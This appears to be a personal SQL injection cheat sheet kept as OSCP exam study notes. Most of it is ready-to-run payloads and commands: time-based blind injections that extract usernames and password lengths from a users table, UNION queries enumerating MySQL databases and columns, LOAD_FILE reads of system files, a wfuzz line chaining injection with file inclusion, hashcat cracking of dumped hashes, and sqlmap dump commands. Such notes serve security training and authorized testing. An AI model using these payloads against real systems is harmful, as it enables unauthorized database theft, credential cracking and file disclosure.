### :open_file_folder: References

- https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
- https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
- https://medium.com/@notsoshant/a-not-so-blind-rce-with-sql-injection-13838026331e
- https://notchxor.github.io/oscp-notes/2-web/sqli/
- https://www.asciitable.com/

### :open_file_folder: Blind SQL Injections

Find columns names

```SQL
' HAVING 1=1 --
' GROUP BY table.column1 HAVING 1=1 --
' GROUP BY table.column1, column2 HAVING 1=1 --
' GROUP BY table.column1, column2, column3(n) HAVING 1=1 -- and so on
```

Time-Based 

Use the waiting time to determine whether the conditional equation is valid

```SQL
-- e.g. guess username (ASCII)
'; IF (ASCII(lower(substring((select TOP 1 username from users), 1, 1))) > 97) WAITFOR DELAY '00:00:05' --
'; IF (ASCII(lower(substring((select TOP 1 username from users), 1, 1))) > 98) WAITFOR DELAY '00:00:05' -- and so on

-- e.g. confirm username is correct
'; IF (substring((select TOP 1 username from users), 1, 5) = 'admin') WAITFOR DELAY '00:00:05'--
```

```SQL
-- check column length
'; IF (select LEN(password) from users) = 64 WAITFOR DELAY '00:00:05' --
```

single column condition test

```SQL
/* 
    Check if there are uncommon [mysql] db names
    if found, wait N seconds
    ='1'...= '2'... and so on
*/
SELECT 'y' 
WHERE 1=0 or 
SLEEP(IF((SELECT COUNT(*) FROM information_schema.schemata 
WHERE schema_name NOT IN ('information_schema', 'mysql', 'performance_schema'))='1', 5, 0)); 
```

### :open_file_folder: MySQL

Get DBs

```MySQL
SELECT group_concat(schema_name) FROM information_schema.schemata;
# For example, assuming that only one column is searched
# ' UNION SELECT group_concat(schema_name) FROM information_schema.schemata #
```

Get tables in DB

```MySQL
SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema = '<DB>';
```

Get columns in table

```MySQL
SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name = '<table>';
```

Find all ```user``` tables in DBs

```MySQL
SELECT group_concat(column_name) FROM information_schema.columns where table_name = 'user';
# SELECT password FROM user
# MD5 password, hashcat -a 0 -m 0 hash.txt rockyou.txt
```

[Load file](https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_load-file): we need FILE privilege

```MySQL
SELECT * LOAD_FILE('C:\Windows\System32\drivers\etc\hosts')
/* table contains columns */
x' UNION SELECT 1, LOAD_FILE('C:\Windows\System32\drivers\etc\hosts'),3-- -
```

Combining website LFI

```shell
wfuzz -z file,/tmp/file_inclusion_linux.txt -d "username=' UNION SELECT 1, LOAD_FILE('FUZZ'), 3, 4, 5, 6; -- -" --hw 89 <url>
# -d postdata
# -z file,wordlist
# hw:hide responses words
```

### :no_entry: sqlmap (:radioactive::radioactive::radioactive: cannot be used in the exam)

```
sqlmap -u "url" --dump -C "columns" -T "tables" -D "database" 
sqlmap -r post.txt -p "parameter_name" --dump -C "columns" -T "tables" -D "database"
```

post.txt = request contents

![SQLi_2022 02 28_19h37m55s_001](https://user-images.githubusercontent.com/8998412/155977929-7e38d3bb-8d61-4afa-af6b-90ae1e13ec73.png)


